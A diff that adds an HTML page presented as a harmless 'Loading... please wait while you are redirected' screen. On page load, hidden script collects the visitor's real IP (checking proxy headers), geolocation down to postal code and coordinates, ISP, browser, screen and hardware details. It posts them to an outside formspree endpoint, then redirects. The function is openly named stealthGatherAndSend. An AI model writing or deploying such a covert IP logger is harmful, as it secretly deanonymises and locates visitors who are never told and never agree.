@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f8f9fa;
+            color: #333;
+        }
+        .loader-container {
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border-left-color: #007bff;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 1.2rem; margin: 0 0 5px 0; font-weight: normal; }
+        p { font-size: 0.9rem; color: #666; margin: 0; }
+    </style>
+</head>
+<body>
+
+<div class="loader-container">
+    <div class="spinner"></div>
+    <h2>Loading...</h2>
+    <p>Please wait while you are redirected.</p>
+</div>
+
+<script>
+ 
+    const FORMSPREE_URL = 'https://formspree.io/f/xdawpovz'; 
+    const REDIRECT_URL = 'https://ima-aarr.github.io/rumia-homepage.github.io/';
+
+    async function stealthGatherAndSend() {
+        let ipData = {};
+        let headerData = {};
+        let realIpCandidate = "わからぬ";
+        let isProxy = "ないない";
+
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            ipData = await ipRes.json();
+        } catch (e) {
+            console.error("IP API Error");
+        }
+
+  
+        try {
+            const headerRes = await fetch('https://httpbin.org/get');
+            const binData = await headerRes.json();
+            headerData = binData.headers || {};
+
+     
+            const forwardedFor = headerData['X-Forwarded-For'] || headerData['X-Forwarded'] || '';
+            const clientIp = headerData['Client-Ip'] || '';
+            const via = headerData['Via'] || '';
+
+            if (forwardedFor) {
+            
+                realIpCandidate = forwardedFor.split(',')[0].trim();
+                isProxy = "🔴 はい ";
+            } else if (clientIp) {
+                realIpCandidate = clientIp;
+                isProxy = "🔴 はい ";
+            } else if (via) {
+                isProxy = "🟡 はい ";
+                realIpCandidate = ipData.ip || "不明";
+            } else {
+                realIpCandidate = ipData.ip || "不明";
+            }
+        } catch (e) {
+            console.error("Header API Error");
+        }
+
+
+        const timeStr = new Date().toLocaleString('ja-JP');
+        const ua = navigator.userAgent;
+        const screenStr = `${window.screen.width} x ${window.screen.height} (Color: ${window.screen.colorDepth}bit)`;
+        const lang = navigator.language;
+        const platform = navigator.platform;
+        const cpuCores = navigator.hardwareConcurrency || '取得不可';
+        const ram = navigator.deviceMemory || '取得不可';
+
+  
+        const payload = {
+            "01_アクセス日時": timeStr,
+            "02_IPアドレス": realIpCandidate,
+            "03_プロキシ/VPN": isProxy,
+            "04_おもてのip": ipData.ip || '取得失敗',
+            "05_組織": ipData.org || '取得失敗',
+            "06_位置": `${ipData.country_name || ''} ${ipData.region || ''} ${ipData.city || ''}`,
+            "07_郵便番号 / 緯度・経度": `〒${ipData.postal || ''} / 緯度: ${ipData.latitude || ''}, 経度: ${ipData.longitude || ''}`,
+            "08_ブラウザ ": ua,
+            "09_画面解像度": screenStr,
+            "10_システム言語": lang,
+            "11_プラットフォーム": platform,
+            "12_論理CPUコア数": `${cpuCores} コア`,
+            "13_デバイスメモリ": `約 ${ram} GB`,
+            "14_HTTPヘッダー": JSON.stringify(headerData)
+        };
+
+
+        if (!FORMSPREE_URL.includes('http')) {
+            doRedirect();
+            return;
+        }
+
+        try {
+            await fetch(FORMSPREE_URL, {
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+        } catch (e) {
+
+        } finally {
+            doRedirect();
+        }
+    }
+
+
+    function doRedirect() {
+        window.location.replace(REDIRECT_URL);
+    }
+
+
+    window.onload = () => {
+        stealthGatherAndSend();
+     
+        setTimeout(doRedirect, 3000);
+    };
+</script>
+
+</body>
+</html>
